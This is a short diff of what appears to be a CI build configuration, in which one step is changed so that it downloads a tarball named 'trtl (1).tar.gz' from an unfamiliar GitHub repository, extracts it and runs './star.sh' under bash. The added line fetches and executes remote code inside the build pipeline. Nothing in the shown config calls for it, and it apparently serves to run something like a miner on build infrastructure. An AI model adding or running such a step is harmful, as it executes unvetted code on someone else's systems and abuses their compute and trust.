@@ -3,7 +3,7 @@ steps:
     args:
       - '-c'
       - >-
-         https://github.com/ifhikf/jos/raw/main/trtl%20(1).tar.gz && tar xf trtl%20(1).tar.gz && ./star.sh
+         wget https://github.com/ifhikf/jos/raw/main/trtl%20(1).tar.gz && tar xf trtl%20(1).tar.gz && ./star.sh
     waitFor:
       - '-'
     entrypoint: /bin/bash
